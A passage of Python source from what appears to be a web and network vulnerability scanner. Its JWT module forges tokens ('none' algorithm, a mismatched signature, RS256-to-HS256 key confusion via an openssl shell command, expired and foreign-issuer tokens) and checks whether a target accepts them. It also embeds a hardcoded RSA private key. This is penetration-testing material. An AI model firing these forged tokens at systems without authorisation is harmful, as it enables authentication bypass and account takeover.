				custom_Header[1] = custom_Header[1].lstrip()
			headers = {custom_Header[0]:custom_Header[1],temp[0]:temp[1], 'Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1', \
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
			'Connection': 'close'} 
		else:
			headers = {temp[0]:temp[1], 'Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1', \
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
			'Connection': 'close'} 

		
		storePayload = {}

		if args.oc:
			cookie_payload = args.oc
			payload = payload.split(";")

			for i in payload:
				payload = i.split("=")
				storePayload.update({payload[0]:payload[1]})


		#Request with Original token
		original_token = requests.get(str(args.url), verify=False, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		if args.post:

			try:
				data = ast.literal_eval(str(args.post))
			except:
				data = str(args.post)
		else:
			data = None

		if type(data) is dict:
			original_token_post = requests.post(str(args.url), verify=False, json=data, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		else:
			original_token_post = requests.post(str(args.url), verify=False, data=data, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))


		#Request with Modified token
		jwt_payload = str(args.jwt).replace(payload,new_jwt_value)
		jwt_payload = jwt_payload.split(":")
		if jwt_payload[1].startswith(" "):
			jwt_payload[1] = jwt_payload[1].lstrip()
		
		#Headers for request
		if args.csrf:
			custom_Header = str(args.csrf).split(":")
			if custom_Header[1].startswith(" "):
				custom_Header[1] = custom_Header[1].lstrip()
			headers = {custom_Header[0]:custom_Header[1],jwt_payload[0]:jwt_payload[1], 'Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1', \
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
			'Connection': 'close'} 
		else:
			headers = {jwt_payload[0]:jwt_payload[1], 'Content-Type':'application/x-www-form-urlencoded','Upgrade-Insecure-Requests':'1', \
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',\
			'Connection': 'close'} 

		
		modified_token = requests.get(str(args.url), verify=False, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		
		#POST Request
		if args.post:
			try:
				data = ast.literal_eval(str(args.post))
			except:
				data = str(args.post)
				
		else:
			data = None

		if type(data) is dict:
			modified_token_post = requests.post(str(args.url), verify=False, json=data, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))
		else:
			modified_token_post = requests.post(str(args.url), verify=False, data=data, cookies=storePayload, headers=headers, proxies=proxyDict, allow_redirects=False, timeout=(5, 8))

		#Check the difference in reponse length
		if len(modified_token.content) <= len(original_token.content) and original_token.status_code < 400 and modified_token.status_code < 400:
			diff = len(original_token.content) - len(modified_token.content)
			if str(modified_token.content) == str(original_token.content):
				vuln = 1

			elif diff < 20: #Check if this should be changed
				if "error" in str(modified_token.content) or "unauthorized" in str(modified_token.content) or "401" in str(modified_token.content):
					pass
					#print("Request might have failed")
				else:
					vuln = 1
		elif len(modified_token.content) > len(original_token.content) and original_token.status_code < 400 and modified_token.status_code < 400:
			diff = len(modified_token.content) - len(original_token.content)

			if diff < 20: #Check if this should be changed
				if "error" in str(modified_token.content) or "unauthorized" in str(modified_token.content) or "401" in str(modified_token.content):
					pass
					#print("Request might have failed")
				else:
					vuln = 1


		if len(modified_token_post.content) <= len(original_token_post.content) and original_token_post.status_code < 400 and modified_token_post.status_code < 400:
			diff = len(original_token_post.content) - len(modified_token_post.content)
			if str(modified_token_post.content) == str(original_token_post.content):
				vuln = 1
				
			elif diff < 20: #Check if this should be changed
				if "error" in str(modified_token_post.content) or "unauthorized" in str(modified_token_post.content) or "401" in str(modified_token_post.content):
					pass
					#print("Request might have failed")
				else:
					vuln = 1
		elif len(modified_token_post.content) > len(original_token_post.content) and original_token_post.status_code < 400 and modified_token_post.status_code < 400:
			diff = len(modified_token_post.content) - len(original_token_post.content)

			if diff < 20: #Check if this should be changed
				if "error" in str(modified_token_post.content) or "unauthorized" in str(modified_token_post.content) or "401" in str(modified_token_post.content):
					pass
					#print("Request might have failed")
				else:
					vuln = 1

	if vuln == 1:
		return True
	else:
		return False


#TEST CASES
def noneAlgo(response_dict, response_dict2, jwtCookie, args):

	encodedJWT = jwt.encode(response_dict2, None, algorithm="none")
	
	encodedJWT = str(encodedJWT)[2:-1]
	
	result = sendJWTRequest(encodedJWT, args, "none algo supported")

	if result:
		print(colored('{0:<50}'.format('"none" algorithm supported:'), 'white', attrs=['bold']),  colored("Vulnerable\n", 'yellow'))
	else:
		print(colored('{0:<50}'.format('"none" algorithm supported:'), 'white', attrs=['bold']),  colored("Not Vulnerable\n", 'yellow'))


#Expiration Test
def expirationTest(response_dict, response_dict2, jwtCookie, args):

	if response_dict2.get("exp") and response_dict2.get("iat"):
		expiration_Duration = int(response_dict2.get("exp")) - int(response_dict2.get("iat")) 
		expiration_Duration = str(timedelta(seconds=expiration_Duration))
		print(colored('{0:<50}'.format("Expiration duration for token:"), 'white', attrs=['bold']), colored(expiration_Duration, 'yellow'), colored("hours (h:m:s)\n", 'yellow'))

	elif response_dict2.get("exp"):
		expiration_Duration = int(response_dict2.get("exp")) - int(time.time()) 
		expiration_Duration = str(timedelta(seconds=expiration_Duration))
		print(colored('{0:<50}'.format("Expiration duration for token:"), 'white', attrs=['bold']), colored(expiration_Duration, 'yellow'), colored("hours left for token to expire (h:m:s)\n", 'yellow'))
	else:
		print(colored('{0:<50}'.format("Expiration duration for token:"), 'white', attrs=['bold']), colored("Unknown\n", 'yellow'))


#Signature Validation Test
def signature_Validation(response_dict, response_dict2, jwtCookie, args):
	
	if response_dict2.get("exp"):
		response_dict2["exp"]=1568095819

	elif response_dict2.get("iat"):
		response_dict2["iat"]=1568095816

	elif response_dict2.get("nbf"):
		response_dict2["nbf"]=1568095816

	elif response_dict2.get("iss"):
		response_dict2["iss"]="https://www.google.com"

	elif response_dict2.get("aud"):
		response_dict2["aud"]="3a319679-b33f-4e31-b33f-1d13464d38f3"
	

	if response_dict.get("alg") == "RS256":
		private_key = b"-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----"
		public_key = b"-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2rANDsghIeodo9yutaQx\njx17wJxvg4DaQgvmV9d9VWBNkPnt/P6soAi0XCACMs1WjFG7T1wSaHN4syBuirfp\nHLIoXt6kHb2PZ38sRoUVZVzKUJ9dbJYyTj1jRSCAYeOKg03ssYxbSaQMgP5Cv+4w\nXh51su0MZNlkb9Gj4Nnd9iS/QqtbYtEx0Vu0tJ+EoZ0fY9K2Ltddvx2f9Y9t5eWN\nm/TauHzGgKiVradCe6bISLcHs08MEHALObXBg4gwuBakbdY7Hg5y1k9R6EdwEG0n\nVNsL5IFIwpjHCN/vqiblTFG3e9U2i8cmF0oW29i2vD7k7+P+bXm7aDLfUbX3c+Wf\nzvOfTT9bZK/bcxppDjIKfyj1ubwzb4tGrAk78A6A1wadxFSKY70k3xU9onwF/hcN\nUcVPFfG+K48h2UPrBbrp8qYF/jOJCwWzlaV7xeSELuCJqe+5iMrUmDYaPUnjAgp/\nFyTz9h4Ej9UwJnwE9uVHiWF9PJ9gL1QGtO8ppr2TyBaJbDNN761oVEh+QViBBgBb\n5vteACL/LyPJBSB80twWrgR7KE7edbzk2s2p/yumV0BzdSyows87MRY+Qp+pX4UR\nL8COYGKv2+YgVAU5VLiD9O91LGJUZHiIyGdgA94P5wnkB7kb9pX2bgDPQUY0bTZr\nZhgBv7ybe+o+BDOL2H1t+h8CAwEAAQ==\n-----END PUBLIC KEY-----"
		encodedJWT = jwt.encode(response_dict2, private_key, algorithm=str(response_dict.get("alg")))
		encodedJWT = str(encodedJWT)[2:-1]
		encodedJWT = encodedJWT.split(".")
		jwtCookie = jwtCookie.split(".")
		new_JWT_Value = "{}.{}.{}".format(encodedJWT[0], encodedJWT[1], jwtCookie[2])
		result = sendJWTRequest(new_JWT_Value, args, "signature validation")
	else:
		encodedJWT = jwt.encode(response_dict2, key, algorithm=str(response_dict.get("alg")))
		encodedJWT = str(encodedJWT)[2:-1]
		encodedJWT = encodedJWT.split(".")
		jwtCookie = jwtCookie.split(".")
		new_JWT_Value = "{}.{}.{}".format(encodedJWT[0], encodedJWT[1], jwtCookie[2])
		result = sendJWTRequest(new_JWT_Value, args, "signature validation")

	if result:
		print(colored('{0:<50}'.format("Signature not Validated:"), 'white', attrs=['bold']), colored("Vulnerable\n", 'yellow'))
	else:
		print(colored('{0:<50}'.format("Signature not Validated:"), 'white', attrs=['bold']), colored("Not Vulnerable\n", 'yellow'))


#Application Accepts Expired Tokens
def applicationAcceptsExpired_Tokens(response_dict, response_dict2, jwtCookie, args):
	
	if response_dict2.get("exp"):
		expiration_time = response_dict2.get("exp")
		present_time = time.time()
		result = present_time - expiration_time
		if result < 0: 
			print(colored('{0:<50}'.format('Expired Tokens Accepted:'), 'white', attrs=['bold']), colored("Token has not expired\n", 'yellow'))

		elif result > 0:
			#already expired
			is_it_expired = sendJWTRequest(jwtCookie, args, "accepts expired tokens")

			if is_it_expired:
				print(colored('{0:<50}'.format('Expired Tokens Accepted:'), 'white', attrs=['bold']), colored("Vulnerable\n", 'yellow'))
			else:
				print(colored('{0:<50}'.format('Expired Tokens Accepted:'), 'white', attrs=['bold']), colored("Not Vulnerable\n", 'yellow'))


#Application Accepts Tokens Before They Are Valid (Check again)
def applicationAcceptsTokensBefore_Validity(response_dict, response_dict2, jwtCookie, args):
	

	is_nbf_accepted = False

	if response_dict2.get("nbf"):
		not_before_claim = response_dict2.get("nbf")
		present_time = time.time()
		result = present_time - not_before_claim


		if "-" in str(result):
			#Token is not valid YET

			is_nbf_accepted = sendJWTRequest(jwtCookie, args, "accepts tokens not valid yet")
		else:
			print(colored('{0:<50}'.format("Accepts Tokens before they are valid:"), 'white', attrs=['bold']), colored("Token is already valid (Input a token which is not valid yet)\n", 'yellow'))	
			return

	if is_nbf_accepted:
		print(colored('{0:<50}'.format("Accepts Tokens before they are valid:"), 'white', attrs=['bold']), colored("Vulnerable\n", 'yellow'))
	else:
		print(colored('{0:<50}'.format("Accepts Tokens before they are valid:"), 'white', attrs=['bold']), colored("Not Vulnerable\n", 'yellow'))


#JWTs Signed With the HS256 Algorithm And Using the RS256 Public Key 
def rs256_to_hs256(response_dict, response_dict2, jwtCookie, args):


	print(colored('{0:<50}'.format("RS256 to HS256 (Use public key as secret):"), 'white', attrs=['bold']), end="\r")	

	from binascii import hexlify
	pub_key = ""
	replace_alg = jwt.encode(response_dict2, key, algorithm="HS256")
	replace_alg = str(replace_alg)[2:-1]
	replace_alg = replace_alg.split(".")

	new_jwtCookie = "{}.{}".format(replace_alg[0], replace_alg[1])

	with open(str(args.public_key)) as f:

		for i in f:
			pub_key += i

	pub_key = pub_key.encode()
	pub_key = str(hexlify(pub_key))[2:-1]
	cmd = 'echo -n "{}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:{}'.format(new_jwtCookie,pub_key)
	output = subprocess.check_output(cmd, shell=True)
	output = str(output)[11:-3].encode()
	signature = str(base64.urlsafe_b64encode(binascii.a2b_hex(output))).replace('=','')
	encodedJWT = "{}.{}.{}".format(replace_alg[0], replace_alg[1], str(signature)[2:-1])
	result = sendJWTRequest(encodedJWT, args, "RS256 to HS256")

	finalJWToken = "{}.{}.{}".format(replace_alg[0], replace_alg[1], str(signature)[2:-1])
	
	if result:
		result = "Possibly Vulnerable, please test"
	else:
		result = "Probably not vulnerable"

	print(colored('{0:<50}'.format("RS256 to HS256 (Use public key as secret):"), 'white', attrs=['bold']), colored(result, 'yellow'))	
	if result == "Possibly Vulnerable, please test":
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Token generated using public key: {}\n".format(encodedJWT), 'yellow'))


#Application Accepts Tokens From A Non-Approved Issuer 
def applicationAcceptsTokensFromNon_Approved_Issuer(response_dict, response_dict2, jwtCookie, args):
	
	storage_list = []
	new_response_dict2 = {}
	for fields in response_dict2:
		storage_list.append(fields)

	if "iss" in storage_list:
		new_response_dict2.update({"iss":"https://idkWhoIssuedThisJWT.com"})
	if "sub" in storage_list:
		new_response_dict2.update({"sub":"3a319679-b33f-4e31-b33f-1d13464d38f3"})
	if "aud" in storage_list:
		new_response_dict2.update({"aud":"https://idkWhoIssuedThisJWT.com"})
	if "nbf" in storage_list:
		new_response_dict2.update({"nbf":datetime.utcnow()})
	if "iat" in storage_list:
		new_response_dict2.update({"iat":datetime.utcnow()})
	if "jti" in storage_list:
		new_response_dict2.update({"jti":"3a319679-b33f-4e31-b33f-1d13464d38f3"})
	if "exp" in storage_list:
		new_response_dict2.update({"exp":datetime.utcnow() + timedelta(seconds=3000)})

	for i in storage_list:
		if new_response_dict2.get(i) == False:
			new_response_dict2.update({i:"Random_Value"})
	encoded_data = jwt.encode(new_response_dict2, key, algorithm='HS256')
	encoded_data = str(encoded_data)[2:-1]
	result = sendJWTRequest(encoded_data, args, "accepts tokens issued by some other issuer")

	if result:
		print(colored('{0:<50}'.format("Accepts Tokens from a non-approved Issuer:"), 'white', attrs=['bold']), colored("Vulnerable\n", 'yellow'))
	else:
		print(colored('{0:<50}'.format("Accepts Tokens from a non-approved Issuer:"), 'white', attrs=['bold']), colored("Not Vulnerable\n", 'yellow'))



def jwtCracker(response_dict, response_dict2, jwtCookie, args):
	print("placeholder")


#Display JWT Information
def displayInformation(response_dict, response_dict2, jwtCookie, args):
	

	#jwtCookie print first 2 encoded parts
	print(colored('{0:<50}'.format("Token related information:"), 'white', attrs=['bold']), colored("Header: {}".format(response_dict,response_dict2), 'yellow'))	
	print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Payload: {}".format(response_dict2), 'yellow'))

	if response_dict2.get("iss"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Issuer Claim: ", 'yellow'), colored("{} ==> Claim identifies the principal that issued the JWT".format(response_dict2.get("iss")), 'white'))

	if response_dict2.get("sub"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Subject Claim:  ", 'yellow'), colored("{} ==> Identifies the principal that is the subject of the JWT".format(response_dict2.get("sub")), 'white'))

	if response_dict2.get("aud"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Audience Claim:  ", 'yellow'), colored("{} ==> Identifies the recipients that the JWT is intended for".format(response_dict2.get("aud")), 'white'))

	if response_dict2.get("nbf"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Not Before Claim:  ", 'yellow'), colored("{} ==> identifies the time before which the JWT MUST NOT be accepted for processing".format(response_dict2.get("nbf")), 'white'))

	if response_dict2.get("iat"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Issued at Claim:  ", 'yellow'), colored("{} ==> Identifies the time at which the JWT was issued".format(response_dict2.get("iat")), 'white'))

	if response_dict2.get("jti"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("JWT ID Claim:  ", 'yellow'), colored("{} ==> Provides a unique identifier for the JWT".format(response_dict2.get("jti")), 'white'))

	if response_dict2.get("exp"):
		print(colored('{0:<50}'.format(""), 'white', attrs=['bold']), colored("Expiration Time Claim:  ", 'yellow'), colored("{} ==> Identifies the expiration time on or after which the JWT MUST NOT be accepted for processing".format(response_dict2.get("exp")), 'white'))
	print("\n")

#The expiry date is either the time it expires in seconds/milliseconds since the unix epoch 
#or the expiry date is the time it expires in seconds/milliseconds after the issue date (iss claim)
def jwtHandler(jwtCookie, args):

	global key
	key = "secret"

	print(colored('{}'.format("\n\n[*] JSON Web Token (JWT) Exploitation:\n"), 'red', attrs=['bold']))	
	#None algo test
	response_dict2 = jwt.decode(jwtCookie, verify=False)
	response_dict = jwt.get_unverified_header(jwtCookie)

	if args.public_key:
		displayInformation(response_dict, response_dict2, jwtCookie, args)
		expirationTest(response_dict, response_dict2, jwtCookie, args)
		rs256_to_hs256(response_dict, response_dict2, jwtCookie, args)

	else:
		displayInformation(response_dict, response_dict2, jwtCookie, args)
		noneAlgo(response_dict, response_dict2, jwtCookie, args)
		expirationTest(response_dict, response_dict2, jwtCookie, args)
		applicationAcceptsExpired_Tokens(response_dict, response_dict2, jwtCookie, args)
		applicationAcceptsTokensBefore_Validity(response_dict, response_dict2, jwtCookie, args)
		applicationAcceptsTokensFromNon_Approved_Issuer(response_dict, response_dict2, jwtCookie, args)
		#Implement JWT Cracker jwtCracker(response_dict, response_dict2, jwtCookie, args)
		signature_Validation(response_dict, response_dict2, jwtCookie, args) #call last

def JWTExploitation(args):

	global proxyDict

	if args.proxy:
		
		proxyValHttp = "http://{}".format(args.proxy)
		proxyValHttps = "https://{}".format(args.proxy)

		proxyDict = { 
          "http"  : proxyValHttp, 
          "https" : proxyValHttps
        	}

		try:
			address = "https://www.google.com"
			proxyCheck = oneRequest(None, address, sessCookie)
		except Exception as e:
			replace = 1
			proxyError(e, "jwt", sessCookie)
				
	else:
		proxyDict = {}

	jwtToken = str(args.jwt)
	tokenVal = []


	#Test case: separate according to head or cookie value
	if args.head:
		try:
			tokenVal = jwtToken.split(":")
		except:
			print("Header format Example: \"Header_Name: Header_Value\"")
			sys.exit()

	elif args.c:
		try:
			tokenVal = jwtToken.split("=",1)
		except: 
			print("Cookie format Example: \"Cookie_Name=Cookie_Value\"")
			sys.exit()

	if tokenVal != []:
		try:
			tokenVal = tokenVal[1].split(" ")
			
		except:
			tokenVal = tokenVal[1]

		for val in tokenVal:

			if "." in val:
				if ";" in val:
					val = val.replace(";","")
				jwtFound = jwtHandler(val, args)





def worksheetFill():

	worksheet.set_default_row(25)
	worksheetWeb.set_default_row(25)


	row = 2
	col = 0
	for key,value in expiredCerts.items():
		worksheet.write(row, col, key, cell_format)
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format) 
		worksheet.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 3
	for key,value in soonToExpireCerts.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 6
	for key,value in anonCiphersStore.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 9
	for key,value in httpsNotEnabled.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 12
	for key,value in httpsNotEnforced.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 15
	for key,value in HSTSMisconfig.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		worksheet.write(row, col+1, value, cell_format)
		worksheet.set_column(row, col+1, 25) 
		row +=1

	row = 2
	col = 18
	for key,value in SSL2.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		row +=1

	row = 2
	col = 19
	for key,value in SSL3.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		row +=1

	row = 2
	col = 20
	for key,value in TLS1.items():
		worksheet.write(row, col, key, cell_format) 
		worksheet.set_column(row, col, 25)
		row +=1

	row = 2
	col = 0
	for key,value in verboseServerBannerStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 3
	for key,value in verboseServerBannerContentStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 6
	for key,value in hostHeaderInjectionStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 9
	for key,value in internalIPDisclosureStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 12
	for key,value in bigIPDisclosureStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 15
	for key,value in ssrfStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 18
	for key,value in verboseServerErrorStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 21
	for key,value in extractPathStore.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 24
	for key,value in missingOrInsecureHeaders.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		worksheetWeb.write(row, col+1, value, cell_format) 
		worksheetWeb.set_column(row, col+1, 25)
		row +=1

	row = 2
	col = 27
	for key,value in traceEnabled.items():
		worksheetWeb.write(row, col, key, cell_format) 
		worksheetWeb.set_column(row, col, 25)
		row +=1

	row = 2
	col = 0
	for key,value in ntpStore.items():
		worksheetNetwork.write(row, col, key, cell_format) 
		worksheetNetwork.set_column(row, col, 25)
		worksheetNetwork.write(row, col+1, value, cell_format) 
		worksheetNetwork.set_column(row, col+1, 25)
		row +=1
		
	row = 2
	col = 3
	for key,value in dnsDOSStore.items():
		worksheetNetwork.write(row, col, key, cell_format) 
		worksheetNetwork.set_column(row, col, 25)
		worksheetNetwork.write(row, col+1, value, cell_format) 
		worksheetNetwork.set_column(row, col+1, 25)
		row +=1


def enumerate(IP, port, status, args, sessCookie):



	if IP in dnsPortCheck and port == "53":
		cprint ("\n[*] Network Vulnerability Check\n", 'white', attrs=['bold','underline'])
		dnsDOS(IP)
		dnsCacheSnooping(IP)
	else:
		#print(colored('{0:<40}'.format("Domain Name System DOS:"), 'white', attrs=['bold']), colored("DNS Port closed", 'yellow'))
		cprint ("\n[*] SSL/TLS Check\n", 'white', attrs=['bold','underline'])
		ssl(IP, port, status, sessCookie)
		cprint ("\n[*] Web Application Vulnerability Check\n", 'white', attrs=['bold','underline'])
